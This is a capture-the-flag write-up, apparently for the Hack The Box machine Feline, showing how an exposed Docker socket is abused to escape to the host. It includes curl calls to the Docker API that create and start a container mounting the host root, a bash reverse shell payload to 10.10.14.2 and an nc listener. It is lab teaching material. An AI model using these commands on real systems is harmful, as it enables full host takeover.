---
description: Interact with host machine via docker socket
---

# Feline HTB

**This list mentions about adding SaltStack support to control Docker through events. If we search for Docker events in the SaltStack documentation, we come across this page. We also see a cURL command inside the .bash\_history of root.**

**According to the SaltStack documentation, it uses the Docker unix socket in order to interact with the Docker API that is running on the host machine. Let's try to list available images using the Docker socket.**

**The command executed successfully, which confirms that we are able to interact with the Docker service running on the host machine. We can create a new Docker container and mount /of the host machine to /mnt/and execute a system command. First, let's create the reverse shell command for the container to execute.**

```
cat todo.txt
```

* Add saltstack support to auto-spawn sandbox dockers through events.
* Integrate changes to tomcat and make the service open to public.

```
engines:
docker_events:
docker_url: unix://var/run/docker.sock
filters:
event:
start
stop
die
oom
```

```
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

```
["/bin/sh","-c","chroot /mnt sh -c \"bash -c 'bash -i>&/dev/tcp/10.10.14.2/
0>&1'\""]
```

**We are creating a JSON array and executing reverse shell inside the host machine, and need to**

**escape shell characters. First, execute the command below on the remote machine, assigning the command to the cmd variable.**

**Next, stand up another Netcat listener locally, and then issue command below on the remote machine to create a container that uses the reverse shell payload. This successfully created a Docker container. However, it won't do anything unless we start it, so let's do that next.**

**Upon creating the container, Docker API will return a container ID as the result. Now we can start the container using this ID (replace the existing ID below), which will execute our command.**

```
cmd="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"bash -c 'bash -
i>&/dev/tcp/10.10.14.2/4446 0>&1'\\\"\"]"
```

```
nc -lvnp 4446
```

```
curl -s -XPOST --unix-socket /var/run/docker.sock -d "
{\"Image\":\"sandbox\",\"cmd\":$cmd, \"Binds\": [\"/:/mnt:rw\"]}" -H 'Content-
Type: application/json' http://localhost/containers/create
```

```
curl -s -XPOST --unix-socket /var/run/docker.sock
http://localhost/containers/fa5ab671afd818ac6a47e02a60b4d1a8fb8eaa156608a582dbe
7a693c603ecb/start
```
